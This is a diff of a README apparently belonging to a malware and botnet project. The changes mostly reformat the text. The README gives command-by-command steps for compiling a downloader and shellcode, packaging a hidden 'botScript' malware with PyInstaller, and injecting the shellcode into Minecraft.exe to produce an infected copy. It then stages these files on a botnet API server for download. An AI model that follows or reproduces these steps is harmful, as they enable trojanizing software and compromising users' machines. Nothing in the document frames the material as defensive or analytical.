@@ -19,22 +19,22 @@ This project was divided in 5 sections that focuses in different aspects of the 
 
 ### Compiling shellcode and mainDownloader
 Maindownloader:
- > `$ cd /Payload`
- > `$ gcc -m32 MainDownloader.c -o MainDownloader.exe -lurlmon`
- > Now, you can place the generated executable inside [API downloads folder](/API/downloads).
+> `$ cd /Payload`
+> `$ gcc -m32 MainDownloader.c -o MainDownloader.exe -lurlmon`
+> Now, you can place the generated executable inside [API downloads folder](/API/downloads).
 
 Payload (shellcode):
- > `$ cd /Payload`
- > `$ ./ShellcodeCompiler_x64.exe -r payload.cpp -a _assembly.asm -p win_x86`
- > Inside the generated file `_assembly.asm` you must manually modify the assembly instruction to fix a bug. You must replace the instruction `mov eax, fs:[ecx + 0x30]` with `mov eax, [fs:ecx + 0x30]`.
- > `$ nasm -g -f win32 _assembly.asm -o _assembly.o`
- > `$ C:/MinGW/bin/ld.exe -g -mi386pe _assembly.o -o _assembly.exe`
- >
- > `$ objdump -d _assembly.exe`
- > - ¡Gitbash required or any alternative! *See tmp.txt file to see the desire output
- >
- > Paste the .text section inside tmp.txt file
- > `$ python dumpShellcode.py tmp.txt`
+> `$ cd /Payload`
+> `$ ./ShellcodeCompiler_x64.exe -r payload.cpp -a _assembly.asm -p win_x86`
+> Inside the generated file `_assembly.asm` you must manually modify the assembly instruction to fix a bug. You must replace the instruction `mov eax, fs:[ecx + 0x30]` with `mov eax, [fs:ecx + 0x30]`.
+> `$ nasm -g -f win32 _assembly.asm -o _assembly.o`
+> `$ C:/MinGW/bin/ld.exe -g -mi386pe _assembly.o -o _assembly.exe`
+>
+> `$ objdump -d _assembly.exe`
+> - ¡Gitbash required or any alternative! *See tmp.txt file to see the desire output
+>
+> Paste the .text section inside tmp.txt file
+> `$ python dumpShellcode.py tmp.txt`
 
 > [!TIP]
 > You can use any other alternative to ouput the shellcode from an excutable.
@@ -46,37 +46,41 @@ Payload (shellcode):
 > You will need gcc, gcc for mutiplatform (32 bits) and nasm installed.
 
 ### Compiling the tasks
- > `$ cd /Scripts`
- > `$ python -m PyInstaller --onefile --noconsole times.py`
- > Now, you can place the generated executable inside [API downloads folder](/API/downloads).
+> `$ cd /Scripts`
+> `$ python -m PyInstaller --onefile --noconsole times.py`
+> Now, you can place the generated executable inside [API downloads folder](/API/downloads).
 
 > [!IMPORTANT]
 > You will need python installed with the module PyInstaller.
 
 ### Compiling the malware
- > `$ cd /Malware`
- > `$ python -m PyInstaller --onefile --noconsole botScript.py`
- > Now, you can place the generated executable inside [API downloads folder](/API/downloads).
+> `$ cd /Malware`
+> `$ python -m PyInstaller --onefile --noconsole botScript.py`
+> Now, you can place the generated executable inside [API downloads folder](/API/downloads).
 
 > [!IMPORTANT]
 > You will need python installed with the module PyInstaller.
 
 ### Infecting the Minecraft executable
- > Paste the shellcode generated previously inside the file `infectPE.cpp` - `char shellcode[] =`.
- >
- > `$ g++ -c PE.cpp -std=c++17`
- > `$ g++ -c InfectPE.cpp -std=c++17`
- > `$ g++ -o InfectPE.exe InfectPE.o PE.o`
- > `$ ./InfectPE.exe ./Minecraft/Minecraft.exe ./Minecraft/Minecraft_Infected.exe`
- > Now, you can place `./Minecraft/Minecraft_Infected.exe` inside [API downloads folder](/API/downloads).
+> Paste the shellcode generated previously inside the file `infectPE.cpp` - `char shellcode[] =`.
+>
+> `$ g++ -c PE.cpp -std=c++17`
+> `$ g++ -c InfectPE.cpp -std=c++17`
+> `$ g++ -o InfectPE.exe InfectPE.o PE.o`
+> `$ ./InfectPE.exe ./Minecraft/Minecraft.exe ./Minecraft/Minecraft_Infected.exe`
+> Now, you can place `./Minecraft/Minecraft_Infected.exe` inside [API downloads folder](/API/downloads).
 
 ## Running the Botnet server:
 Before starting the server, remember to change the IP address depending on how you setup the network or the server itself (you could use directly `0.0.0.0:80`) inside `/API/BotnetAPI.py`.
- > `$ cd /API`
- > `$ python BotnetAPI.py`
+> `$ cd /API`
+> `$ pip install -r requirements.txt`
+> `$ python BotnetAPI.py`
+
+> [!IMPORTANT]
+> You will need python installed.
 
 > [!TIP]
-> Theoretically, you can deploy to docker this API. However, it was tested for this project.
+> Theoretically, you can deploy to docker this API. However, it was not tested for this project.
 
 ## Considerations
 
